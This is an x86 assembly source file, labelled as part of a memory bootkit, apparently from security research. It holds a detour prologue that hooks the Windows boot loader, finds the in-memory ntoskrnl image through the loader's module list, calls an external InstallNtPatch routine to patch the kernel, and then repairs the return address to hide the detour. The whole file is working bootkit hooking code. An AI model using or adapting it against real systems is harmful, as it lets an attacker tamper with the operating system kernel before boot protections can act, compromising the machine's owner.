TITLE "ItSec Memory bootkit Assembler file"
.386
.model flat

EXTERN _InstallNtPatch:NEAR		;__cdecl calling convention
;EXTERN _InstallNtPatch@8:NEAR	;__stdcall calling convention

.data

.code
_WinloadPatchPrologue PROC
	; Set correct segment registers
	mov     ax,10h
	mov     ds,ax
	mov     es,ax
	mov     ss,ax
	mov     gs,ax

	PUSHAD
	; Get NtosKrnl base address and size (see _PEB_LDR_DATA structure)
	mov eax, dword ptr [esp+08h+20h]		; 0x20 is size of PUSHAD
	mov eax, dword ptr [eax+10h]			; EAX = pebLdrData->InLoadOrderModuleList.Flink
	push dword ptr [eax+20h]		; PUSH Ntoskrnl size
	push dword ptr [eax+18h]		; PUSH Nt base Address
	nop
	
	; EFI_STATUS InstallNtPatch(LPBYTE ntStartAddr, DWORD size);	
	CALL _InstallNtPatch
	add esp, 08h			; Cdecl args cleaning
	nop

	POPAD
	
	; Fix return address
	pop eax
	sub eax, 07h			; 0x7 is size of Detour code
	jmp eax
_WinloadPatchPrologue ENDP

	int 3
	int 3
	int 3
	int 3
END